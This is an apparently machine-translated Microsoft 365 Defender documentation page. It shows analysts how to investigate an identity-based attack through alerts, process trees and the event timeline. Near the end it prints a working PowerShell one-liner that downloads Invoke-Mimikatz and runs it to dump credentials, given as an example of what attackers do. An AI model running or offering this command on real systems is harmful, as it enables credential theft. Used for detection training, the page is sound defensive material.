---
title: 基于身份的攻击示例
description: 逐步完成基于身份的攻击的示例分析。
keywords: 事件， 警报， 调查， 关联， 攻击， 计算机， 设备， 用户， 标识， 标识， 邮箱， 电子邮件， 365， microsoft， m365， 事件响应， 网络攻击
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 883c0480b5f8cb35abfe59458d35c8d1274b8493
ms.sourcegitcommit: bdd6ffc6ebe4e6cb212ab22793d9513dae6d798c
ms.translationtype: MT
ms.contentlocale: zh-CN
ms.lasthandoff: 03/08/2022
ms.locfileid: "63327529"
---
# <a name="example-of-an-identity-based-attack"></a>基于身份的攻击示例

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**适用于：**
- Microsoft 365 Defender

Microsoft Defender for Identity 可帮助检测恶意尝试泄露组织标识。 由于 Defender for Identity 与 Microsoft 365 Defender集成，因此安全分析师可以了解来自 Defender for Identity 的威胁，例如可疑的 Netlogon 特权提升尝试。

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>分析 Microsoft Defender 中针对标识的攻击

Microsoft 365 Defender分析员可以在事件页面的"警报"选项卡上按检测源筛选警报。 在下面的示例中，将检测源筛选为 **Defender for Identity**。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="筛选 Defender for Identity 的检测源的示例。":::

选择 **可疑的哈希** 攻击警报将转到 Microsoft Defender for Cloud Apps 中显示更多详细信息的页面。 通过选择"了解有关此警报类型"以阅读攻击描述以及修正建议，你始终可以了解有关警报或[](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002)攻击的更多信息。
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="可疑的哈希攻击警报示例。"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>调查 Microsoft Defender for Endpoint 中的相同攻击

或者，分析员可以使用 Defender for Endpoint 了解有关终结点上活动更多信息。 从事件队列中选择事件，然后选择" **警报"** 选项卡。在这里，他们还可以识别检测源。 标记为终结点的检测源EDR终结点检测和响应，即终结点的 Defender。 从此处，分析员选择由用户检测到EDR。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Defender for Endpoint 中的终结点检测和响应示例。"::: 

警报页面显示各种相关信息，如影响的设备名称、用户名、自动调查的状态以及警报详细信息。 警报情景描述进程树的可视化表示形式。 进程树是与警报相关的父进程和子进程的分层表示形式。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Defender for Endpoint 中的警报进程树示例。"::: 

可以展开每个进程以查看其他详细信息。 分析师可以看到的详细信息是作为恶意脚本的一部分输入的实际命令、出站连接 IP 地址和其他有用信息。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Defender for Endpoint 中进程详细信息的示例。":::
 
通过选择 **"在时间线中** 查看"，分析员可以进一步向下钻取以确定泄露的确切时间。 

Microsoft Defender for Endpoint 可以检测许多恶意文件和脚本。 但是，由于出站连接、PowerShell 和命令行活动的许多合法用途，某些活动在创建恶意文件或活动之前被视为恶意活动。 因此，使用时间线可帮助分析员将警报置于与周围活动的上下文中，以确定攻击的原始源或时间，否则，常见文件系统和用户活动会掩盖这些攻击。 

为完成此操作，分析员将在警报检测 () 向后滚动，以确定导致恶意活动的原始活动何时实际启动。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="警报检测时开始的示例。"::: 

必须了解并区分常见活动，如 Windows 更新连接、Windows 受信任的软件激活流量、与 Microsoft 站点的其他常见连接、第三方 Internet 活动、Microsoft Endpoint Configuration Manager 活动以及其他恶意活动与可疑活动。 实现此目的的一个方法就是使用时间线筛选器。 有许多筛选器可在筛选掉分析员不想查看的一切内容时突出显示特定活动。 

在下图中，分析员经过筛选，以便仅查看网络和处理事件。 这允许分析员查看与事件（记事本 IP 地址建立连接）周围的网络连接和进程，我们在进程树中也可以看到这一点。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="如何使用 记事本进行恶意出站连接的示例。"::: 

在此特定事件，记事本恶意出站连接。 但是，攻击者通常只会iexplorer.exe来建立连接来下载恶意负载，因为通常iexplorer.exe进程被视为常规 Web 浏览器活动。

时间线中要查找的另一项是 PowerShell 用于出站连接。 分析员会通过命令（如 后跟托管恶意文件的网站的出站连接）查找成功的 PowerShell `IEX (New-Object Net.Webclient)` 连接。 

在下面的示例中，PowerShell 用于从网站下载和执行 Mimikatz：

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
分析员可以通过在搜索栏中键入关键字来快速搜索关键字，以仅显示使用 PowerShell 创建的事件。 

## <a name="next-step"></a>后续步骤

请参阅 [网络钓鱼调查](first-incident-path-phishing.md) 路径。

## <a name="see-also"></a>另请参阅

- [事件概述](incidents-overview.md)
- [管理事件](manage-incidents.md)
- [调查事件](investigate-incidents.md)
